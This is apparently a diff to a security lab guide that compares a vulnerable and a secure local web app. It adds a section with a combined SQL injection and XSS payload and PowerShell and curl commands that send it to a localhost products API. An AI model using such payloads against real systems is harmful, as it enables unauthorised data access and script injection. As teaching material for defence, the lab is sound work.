@@ -786,7 +786,7 @@ curl -i "http://127.0.0.1:5001/api/admin/users" -H "Authorization: Bearer $token
 
 ---
 
-# TODO (11) Bonus — SQL Injection Products API/Page
+# TODO (11) Bonus — SQL Injection and XSS Through the Products API/Page
 
 ## Security objective
 
@@ -818,7 +818,7 @@ headers=(-H "Authorization: Bearer $token")
 
 For the secure application, repeat the login against port `5001` and use its token.
 
-## SQL Injection
+## Part A — SQL Injection
 
 Use the products API with the following lab payload:
 
@@ -877,7 +877,34 @@ With the authenticated request, the lab payload should alter the vulnerable SQL 
 | Vulnerable | Query behavior is altered by the injected SQL expression. |
 | Secure | Input is treated as data; the query structure is not altered. |
 
+---
 
+## Part B — API-assisted XSS / Unsafe HTML Rendering
+
+Use the following lab payload:
+
+```text
+x%' UNION SELECT 1,'<img src=x onerror=alert(1)>','x' --
+```
+
+### API test
+
+```powershell
+$payload = "x%' UNION SELECT 1,'<img src=x onerror=alert(1)>','x' --"
+$encoded = [uri]::EscapeDataString($payload)
+
+Invoke-WebRequest `
+  -Uri "http://127.0.0.1:5000/api/products?search=$encoded" `
+  -Method GET `
+  -Headers $headers
+```
+
+### Ubuntu / Bash
+
+```bash
+payload="x%' UNION SELECT 1,'<img src=x onerror=alert(1)>','x' --"
+curl -i -G "http://127.0.0.1:5000/api/products" "${headers[@]}" --data-urlencode "search=$payload"
+```
 
 Repeat against port `5001`.
 
